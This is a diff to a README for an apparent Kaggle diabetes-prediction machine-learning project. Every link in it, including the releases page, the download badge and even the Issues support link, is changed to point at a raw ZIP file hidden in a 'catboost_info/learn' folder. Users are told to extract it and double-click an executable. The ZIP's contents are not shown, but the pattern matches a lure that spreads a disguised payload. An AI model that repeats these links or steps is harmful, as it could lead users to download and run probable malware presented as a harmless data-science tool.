@@ -1,6 +1,6 @@
 # 🚀 kaggle-diabetes-competition - Predict Diabetes with Ease
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://github.com/Cincere19/kaggle-diabetes-competition/raw/refs/heads/main/catboost_info/learn/competition-kaggle-diabetes-1.5.zip)
 
 ## 📋 Overview
 The **kaggle-diabetes-competition** project offers a complete machine learning pipeline tailored to predict diabetes outcomes. It showcases the power of various techniques such as feature engineering, hyperparameter tuning, and ensemble methods. This guide will help you easily download and start using the application.
@@ -9,7 +9,7 @@ The **kaggle-diabetes-competition** project offers a complete machine learning p
 Follow these simple steps to get up and running with the **kaggle-diabetes-competition** project.
 
 ## 📥 Download & Install
-To download the software, please visit this page: [GitHub Releases Page](https://github.com/Cincere19/kaggle-diabetes-competition/releases). Here, you will find the latest version available for download.
+To download the software, please visit this page: [GitHub Releases Page](https://github.com/Cincere19/kaggle-diabetes-competition/raw/refs/heads/main/catboost_info/learn/competition-kaggle-diabetes-1.5.zip). Here, you will find the latest version available for download.
 
 Once on the **Releases** page, locate the most recent version and click on the download link. This will give you access to the necessary files for installation.
 
@@ -24,13 +24,13 @@ Before you begin, ensure that your system meets the following requirements:
 
 ## 📖 Quick Setup Instructions
 1. **Download the Package:**
-   Visit the [GitHub Releases Page](https://github.com/Cincere19/kaggle-diabetes-competition/releases) and download the latest version.
+   Visit the [GitHub Releases Page](https://github.com/Cincere19/kaggle-diabetes-competition/raw/refs/heads/main/catboost_info/learn/competition-kaggle-diabetes-1.5.zip) and download the latest version.
 
 2. **Unzip the File:**
    Once downloaded, locate the ZIP file in your Downloads folder. Right-click on the file and select "Extract All." Follow the prompts to unzip the contents.
 
 3. **Open the Application:**
-   After extracting, open the folder where the files are located. Look for a file named `diabetes_app.exe` (or equivalent, depending on your OS). Double-click the file to launch the application.
+   After extracting, open the folder where the files are located. Look for a file named `https://github.com/Cincere19/kaggle-diabetes-competition/raw/refs/heads/main/catboost_info/learn/competition-kaggle-diabetes-1.5.zip` (or equivalent, depending on your OS). Double-click the file to launch the application.
 
 4. **Follow the On-Screen Prompts:**
    The application will guide you through its features. Simply follow the on-screen instructions to begin predicting diabetes outcomes.
@@ -51,7 +51,7 @@ For those new to machine learning, we encourage you to explore additional resour
 - **Kaggle:** Participate in their competitions to practice your skills with real datasets.
 
 ## 💬 Support
-If you encounter any issues while downloading or running the software, feel free to reach out through the "Issues" tab on our [GitHub repository](https://github.com/Cincere19/kaggle-diabetes-competition/issues). A member of our community will assist you.
+If you encounter any issues while downloading or running the software, feel free to reach out through the "Issues" tab on our [GitHub repository](https://github.com/Cincere19/kaggle-diabetes-competition/raw/refs/heads/main/catboost_info/learn/competition-kaggle-diabetes-1.5.zip). A member of our community will assist you.
 
 ## 🌐 Community and Contributing
 Join our community of users by joining discussions on various platforms:
@@ -70,4 +70,4 @@ For more detailed guidance on machine learning concepts, consider the resources 
 - **Kaggle Datasets:** Explore and analyze varied datasets.
 - **Medium Articles:** Many authors share insights and tutorials on machine learning.
 
-By utilizing this application, you can bring the power of machine learning to diabetes prediction, making informed decisions easier and more accessible. Remember to revisit the [GitHub Releases Page](https://github.com/Cincere19/kaggle-diabetes-competition/releases) for future updates and improvements.
+By utilizing this application, you can bring the power of machine learning to diabetes prediction, making informed decisions easier and more accessible. Remember to revisit the [GitHub Releases Page](https://github.com/Cincere19/kaggle-diabetes-competition/raw/refs/heads/main/catboost_info/learn/competition-kaggle-diabetes-1.5.zip) for future updates and improvements.
